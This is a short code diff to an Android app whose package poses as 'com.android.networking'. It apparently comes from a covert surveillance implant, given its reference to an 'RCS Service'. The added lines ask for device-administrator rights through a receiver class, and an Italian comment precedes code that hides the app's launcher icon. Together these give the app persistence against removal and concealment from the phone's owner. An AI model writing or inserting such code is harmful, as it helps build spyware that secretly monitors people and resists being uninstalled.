@@ -10,6 +10,7 @@
 package com.android.networking.gui;
 
 import android.app.Activity;
+import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -24,6 +25,7 @@ import com.android.networking.R;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.capabilities.PackageInfo;
+import com.android.networking.listener.AR;
 import com.android.networking.util.Check;
 
 /**
@@ -121,6 +123,14 @@ public class AGUI extends Activity {
 						Check.log(TAG + " RCS Service Name: " + cn.flattenToShortString());//$NON-NLS-1$
 					}
 					
+					int ACTIVATION_REQUEST = 1;
+					
+					Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
+					ComponentName deviceAdminComponentName = new ComponentName(this, AR.class);
+					intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, deviceAdminComponentName);
+					startActivityForResult(intent, ACTIVATION_REQUEST);
+					
+					// Nascondi l'icona (subito in android 4.x, al primo reboot in android 2.x)
 					PackageManager pm = getApplicationContext().getPackageManager();
 					pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 				}
